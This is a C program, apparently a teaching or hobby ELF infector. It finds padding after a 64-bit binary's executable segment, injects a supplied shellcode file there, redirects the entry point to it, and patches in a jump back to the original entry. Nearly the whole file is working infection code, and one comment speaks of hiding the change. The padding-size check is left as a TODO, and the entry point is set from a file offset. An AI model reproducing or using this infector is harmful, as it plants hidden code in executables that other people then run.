/** ELF Infector
 *
 * This program injects a shellcode snippet into an ELF, define the __start?? to jump to the shellcode at the beginning.
 * It also patches the shellcode to jump to the original entry point after executing the shellcode.
 *
 */

#include <stdio.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <elf.h>
#include <string.h>
#include <stdlib.h>

struct elf_segment_padding {
	Elf64_Off offset;
	size_t size;
	Elf64_Phdr *phdr_entry;
};

/* This function opens and reads the file, maps a memory region (RWX)
 * and loads the content of the file into that region.
 *
 * The address of the allocated memory is stored in memory and its
 * size is stored in length. Returns 0 on sucess and -1 otherwise.
 */
int load_elf_target(char *path, void **memory, size_t *length)
{
	int fd;
	struct stat buf;

	if ((fd = open(path, O_RDWR)) < 0) {
		perror("[!] open() failed");
		return -1;
	}

	if (fstat(fd, &buf) != 0) {
		close(fd);
		perror("[!] fstat() failed");
		return -1;
	}

	*length = buf.st_size;

	if ((*memory = mmap(NULL, *length, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_SHARED, fd, 0)) == MAP_FAILED) {
		close(fd);
		perror("[!] mmap() failed");
		return -1;
	}

	printf("    memory loaded %ld bytes at %p\n", *length, *memory);

	return close(fd);
}

/* This function returns 0 if the memory contains a valid ELF file.
 * Otherwise, non-zero is returned. Currently it only checks if
 * there is the ELF magic at the beginning of the memory.
 */
int elf_validate(void *memory, size_t memory_length)
{
	if (SELFMAG > memory_length)
		return -1;

	if (strncmp((char *) memory, ELFMAG, SELFMAG))
		return -1;

	return 0;
}

/* This function searches for a gap between two segments (the first one with RX permissions) that is big
 * enough to drop something there.
 */
int elf_find_padding(void *elf_target, size_t elf_target_size, struct elf_segment_padding *pad, size_t minimum_size)
{
	Elf64_Ehdr *ehdr = (Elf64_Ehdr *) elf_target;
	Elf64_Phdr *phdr_entry = NULL;
	size_t number_exec_segments = 0;

	// Get the first entry in the program header table:
	phdr_entry = (Elf64_Phdr *) ((unsigned char *) ehdr + (unsigned int) ehdr->e_phoff);

	pad->size = elf_target_size;

	printf("    Search for padding in %d segments...\n", ehdr->e_phnum);

	for (size_t i = 0; i < (size_t) ehdr->e_phnum; i++) {
		if (phdr_entry->p_type == PT_LOAD) {
			if ((phdr_entry->p_flags & (PF_R | PF_X)) == (PF_R | PF_X)) {
				number_exec_segments += 1;

				printf("    RX Segment Found (#%ld)\n", i);

				// TODO: check if pad large enough

				// End of segment (where to put parasite to):
				pad->offset = (Elf64_Off) (phdr_entry->p_offset + phdr_entry->p_filesz);
				pad->phdr_entry = phdr_entry;
			} else if (number_exec_segments > 0 && (phdr_entry->p_offset - pad->offset) < pad->size) {
				pad->size = phdr_entry->p_offset - pad->offset;
			}
		}

		// Get the next entry in the program header table:
		phdr_entry = (Elf64_Phdr *) ((unsigned char *) phdr_entry + (unsigned int) ehdr->e_phentsize);
	}

	return number_exec_segments;
}

/* Infects the ELF binary by (1) searching a padding between segments to drop the shellcode there, (2) adjust the entry point,
 * (3) write the shellcode, (4) patch the shellcode by adding the original entry point and (5) adjust ELF header
 */
int infect_elf_binary(void *elf_target, size_t elf_target_size, void *parasite, size_t parasite_size)
{
	Elf64_Ehdr *e_hdr;
	Elf64_Addr original_entry;
	struct elf_segment_padding pad;

	char slider[12];

	printf("    elf_target = %p, size = %ld, parasite = %p, size = %ld\n", elf_target, elf_target_size, parasite, parasite_size);
	e_hdr = (Elf64_Ehdr *) elf_target;

	// 1. Search for padding that is large enough
	if (elf_find_padding(elf_target, elf_target_size, &pad, parasite_size + 12) == 0) {
		fprintf(stderr, "[!] searching for a valid segment padding failed\n");
		return -1;
	}

	printf("    segment padding found at offset 0x%lx (%ld bytes)\n", pad.offset, pad.size);

	// 2. Store original entry point and reset it:
	original_entry = e_hdr->e_entry;
	e_hdr->e_entry = pad.offset; // address start of padding

	printf("    Original Entry Point: %p\n", (void *) original_entry);
	printf("    New Entry Point: %p\n", (void *) e_hdr->e_entry);

	// 3. Inject parasite into padding
	memcpy((char *) elf_target + e_hdr->e_entry, parasite, parasite_size);

	// 4. Patch parasite with "jmp old_entry_point"
	//  > 48 b8 aa bb cc ...  mov rax, 0xhhgg...ccbbaa
	//  > ff e0               jmp rax
	memcpy(slider, "\x48\xb8", 2);
	*((Elf64_Addr *) &slider[2]) = original_entry;
	memcpy(slider + 10, "\xff\xe0", 2);
	memcpy((char *) elf_target + e_hdr->e_entry + parasite_size, slider, 12);

	// 5. Adjust phdr_entry: patch p_filesz and p_memsz
	(pad.phdr_entry)->p_filesz += parasite_size + 12;
	(pad.phdr_entry)->p_memsz += parasite_size + 12;

	// 6. Optional: Patch Section Header to be undercover
	// ...

	return 0;
}

int main(int argc, char **argv)
{
	void *elf_target, *parasite;
	size_t elf_target_size, parasite_size;
	int return_value = 0;

	if (argc != 3) {
		fprintf(stderr, "Usage: %s <elf_target> <shellcode>\n", argv[0]);
		return -1;
	}

	// Load ELF file into memory and perform a simple check if the given
	// file is (something like) a valid ELF.
	printf("[+] load elf_target '%s' into memory\n", argv[1]);
	if (load_elf_target(argv[1], &elf_target, &elf_target_size)) {
		fprintf(stderr, "[!] can't load elf_target into memory\n");
		return -1;
	}

	if (elf_validate(elf_target, elf_target_size) != 0) {
		fprintf(stderr, "[!] ELF-magic check on elf_target failed\n");
		return_value = -1;
		goto out;
	}

	// Load the shellcode into memory:
	printf("[+] loading parasite '%s' into memory...\n", argv[2]);
	if (load_elf_target(argv[2], &parasite, &parasite_size)) {
		fprintf(stderr, "[!] can't load parasite into memory\n");
		return -1;
	}

	// Inject shellcode into ELF file:
	printf("[+] infect elf_target now\n");
	if (infect_elf_binary(elf_target, elf_target_size, parasite, parasite_size) != 0) {
		fprintf(stderr, "[!] infecting elf binary failed\n");
		return_value = -1;
		goto out;
	}

	printf("[+] infection done\n");

out:
	// Close elf_target:
	if (munmap(elf_target, elf_target_size) != 0) {
		perror("[!] munmap() failed\n");
		return_value = -1;
	}

	if (munmap(parasite, parasite_size) != 0) {
		perror("[!] munmap() failed\n");
		return_value = -1;
	}

	return return_value;
}
